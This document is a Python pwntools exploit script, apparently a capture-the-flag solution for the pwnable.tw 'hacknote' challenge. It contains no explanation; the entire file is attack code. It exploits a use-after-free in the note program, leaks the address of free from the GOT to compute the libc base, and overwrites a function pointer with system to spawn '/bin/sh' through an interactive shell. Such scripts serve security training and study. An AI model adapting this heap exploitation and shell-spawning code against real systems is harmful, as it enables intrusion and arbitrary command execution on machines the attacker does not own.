#!/usr/bin/python
from pwn import *
import os
e = ELF("./hacknote")
libc = ELF("./libc_32.so.6")
if 'remote' in os.environ:
	io = remote('chall.pwnable.tw',10102)
else:
	io = process(e.path,aslr=True,env={'LD_PRELOAD': './libc_32.so.6'})
def add(content,size):
	log.info(io.recv(timeout=0.25))
	io.send("1")
	io.sendafter("Note size :",str(size))
	io.sendafter("Content :",content)
def delete(idx):
	log.info(io.recv(timeout=0.25))
	io.send("2")
	io.sendafter("Index :",str(idx))
def prt(idx):
	log.info(io.recv(timeout=0.25))
	io.send("3")
	io.sendafter("Index :",str(idx))
raw_input("Exploit?")
#add("A"*1000,1000)
add("B"*1000,1000)
add("C"*1000,1000)
delete(1)
delete(0)
add(cyclic(1008)+p32(0x0804862b)+p32(e.got['free']),1500)
prt(1)
d = io.recv()
log.info(repr(d))
freegot = u32(d[0:4])
log.success("free: "+hex(freegot))
libcbase = freegot - libc.symbols['free']
log.success("libc base: "+hex(libcbase))
delete(2)
#raw_input("Continue?")
target=libcbase+libc.symbols['system']
add(cyclic(1008)+p32(target)+";/bin/sh\x00",1500)
prt(1)
io.interactive()
